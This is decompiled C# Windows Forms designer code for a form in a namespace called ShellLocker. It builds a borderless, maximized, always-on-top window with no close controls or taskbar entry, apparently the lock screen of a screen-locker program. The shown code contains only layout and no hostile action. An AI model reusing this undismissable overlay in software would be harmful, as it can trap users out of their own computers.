namespace ShellLocker
{
	// Token: 0x0200000C RID: 12
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class Form2 : global::System.Windows.Forms.Form
	{
		// Token: 0x06000041 RID: 65 RVA: 0x000030FC File Offset: 0x000012FC
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x0000313C File Offset: 0x0000133C
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::ShellLocker.Form2));
			this.Timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.PictureBox1 = new global::System.Windows.Forms.PictureBox();
			((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
			base.SuspendLayout();
			this.Timer1.Interval = 1;
			this.PictureBox1.Location = new global::System.Drawing.Point(11, -11);
			this.PictureBox1.Name = "PictureBox1";
			this.PictureBox1.Size = new global::System.Drawing.Size(10, 10);
			this.PictureBox1.TabIndex = 18;
			this.PictureBox1.TabStop = false;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.Black;
			this.BackgroundImage = (global::System.Drawing.Image)componentResourceManager.GetObject("$this.BackgroundImage");
			this.BackgroundImageLayout = global::System.Windows.Forms.ImageLayout.Stretch;
			base.ClientSize = new global::System.Drawing.Size(1302, 710);
			base.ControlBox = false;
			base.Controls.Add(this.PictureBox1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "Form2";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.Manual;
			base.TopMost = true;
			base.WindowState = global::System.Windows.Forms.FormWindowState.Maximized;
			((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x04000026 RID: 38
		private global::System.ComponentModel.IContainer components;
	}
}
